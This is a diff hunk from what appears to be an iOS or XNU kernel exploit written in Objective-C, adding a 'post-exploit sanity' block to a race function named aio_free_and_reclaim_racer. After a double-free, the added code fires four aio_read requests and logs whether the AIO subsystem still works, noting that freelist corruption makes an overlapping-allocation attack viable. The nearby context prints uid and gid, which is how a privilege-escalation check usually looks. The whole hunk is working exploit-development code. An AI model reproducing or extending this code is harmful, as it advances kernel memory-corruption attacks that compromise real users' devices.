@@ -5784,6 +5784,37 @@ static void *aio_free_and_reclaim_racer(void *arg) {
         close(kq);
     }
 
+    // ---- Post-exploit sanity: check AIO subsystem health ----
+    // After double-free, can we still allocate AIO entries? If so, the freelist
+    // corruption can be exploited for overlapping allocations (AIO + non-AIO).
+    [self appendLog:@"\n--- Post-double-free AIO health check ---"];
+    {
+        static struct aiocb hcbs[4];
+        static char hbufs[4][4096];
+        int hok = 0;
+        for (int i = 0; i < 4; i++) {
+            memset(&hcbs[i], 0, sizeof(hcbs[i]));
+            hcbs[i].aio_fildes = fd;
+            hcbs[i].aio_buf = hbufs[i];
+            hcbs[i].aio_nbytes = 512;
+            hcbs[i].aio_offset = 0;
+            hcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
+            if (aio_read(&hcbs[i]) == 0) hok++;
+        }
+        [self appendLog:[NSString stringWithFormat:@"  Post-UAF aio_read: %d/4 succeeded", hok]];
+        if (hok > 0) {
+            [self appendLog:@"  >> AIO subsystem still functional — overlapping alloc attack viable <<"];
+            for (int i = 0; i < 4; i++) {
+                if (aio_error(&hcbs[i]) != EINVAL && aio_error(&hcbs[i]) != -1) {
+                    while (aio_error(&hcbs[i]) == EINPROGRESS) usleep(100);
+                    aio_return(&hcbs[i]);
+                }
+            }
+        } else {
+            [self appendLog:@"  >> AIO subsystem DEAD after double-free — need alternate approach <<"];
+        }
+    }
+
     close(fd);
     unlink(path.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
